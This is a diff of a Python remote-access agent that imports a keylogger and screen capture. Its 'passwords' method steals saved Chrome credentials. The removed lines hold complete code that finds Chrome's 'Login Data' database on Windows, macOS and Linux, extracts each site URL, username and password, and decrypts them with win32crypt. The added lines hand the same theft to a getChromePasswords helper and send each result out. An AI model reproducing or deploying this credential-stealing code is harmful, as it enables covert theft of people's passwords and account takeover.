@@ -18,7 +18,7 @@ import getpass
 
 from pynput.keyboard import Key, Listener
 import cv2
-import sqlite3
+from passwords import getChromePasswords
 
 if os.name == 'nt':
     from PIL import ImageGrab
@@ -323,43 +323,9 @@ class Agent(object):
 
     @threaded
     def passwords(self):
-        info_list = []
-        # get path
-        path = ''
-        if os.name == 'nt':  # Windows
-            path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
-        elif os.name == 'posix':
-            path = os.getenv('HOME')
-            if platform.system() == 'darwin':  # MacOS
-                path += 'Library/Application Support/Google/Chrome/Default'
-            else:  # Linux
-                path += '/.config/google-chrome/Default/'
-        try:
-            connection = sqlite3.connect(path + 'Login Data')
-            with connection:
-                cursor = connection.cursor()
-                v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-                value = v.fetchall()
-
-            for website_url, username, password in value:
-                if os.name == 'nt':
-                    try:
-                        import win32crypt
-                        password = win32crypt.CryptUnProtectData(password, None, None, None, 0)[1]
-                    except:
-                        self.send_output("importing win32crypt to decrypt stored password failed")
-
-                if password:
-                    info_list.append({
-                        'website_url': website_url,
-                        'username': username,
-                        'password': str(password)
-                    })
-
-            self.send_output(info_list)
-            
-        except:
-            self.send_output("User is not using Google Chrome")
+        data = getChromePasswords()
+        for element in data:
+            self.send_output(element)
 
 
     def help(self):
